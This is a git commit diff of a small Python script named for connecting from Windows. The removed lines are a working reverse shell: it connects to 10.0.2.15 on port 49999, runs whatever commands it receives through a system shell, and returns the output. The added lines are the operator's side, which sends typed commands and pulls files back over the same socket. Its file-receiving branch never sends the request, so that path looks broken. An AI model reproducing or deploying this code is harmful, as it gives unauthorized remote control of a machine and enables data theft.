7c28d9c11dfa638ac71940565cacdc1975a3a7ee
BordeianuAdrian <40962340+BordeianuAdrian@users.noreply.github.com>
2020-06-26 14:49:16 +0300

    w

--- python_connect_from_windows.py
+++ python_connect_from_windows.py
@@ -1,19 +1,31 @@
-#!/usr/bin/env python
-#_*_ coding: utf8 _*_
-
 import socket
-import subprocess
+import time
+import sys
 
-cliente = socket.socket()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+port = 49999
+s.connect(('localhost', port))
 
-try:
-    cliente.connect(('10.0.2.15',49999))
-    cliente.send("1".encode('utf-8'))
+while True:
+	msg = input("Command To Send: ")
+	if msg == "D":
+	   s.close()
+	   sys.exit(0)
 
-    while True:
-        c = cliente.recv(1024).decode('utf-8')
-        comando = subprocess.Popen(c,shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-        cliente.send(comando.stdout.read())
-except Exception as e:
-    print(e)
+	if(msg.split(" ")[0] == "G"):
+		msg = msg + "\n"
 
+		f = open('torecv.jpg','wb')
+		while (True):
+		    print ("Receiving...")
+		    l = s.recv(4096)
+		    f.write(l)
+		    if len(l) < 4096:
+		        break
+
+		f.close()
+	else:
+		msg = msg + "\n"
+		s.send(msg.encode('utf-8'))
+		msg = s.recv(4096)
+		print (msg)
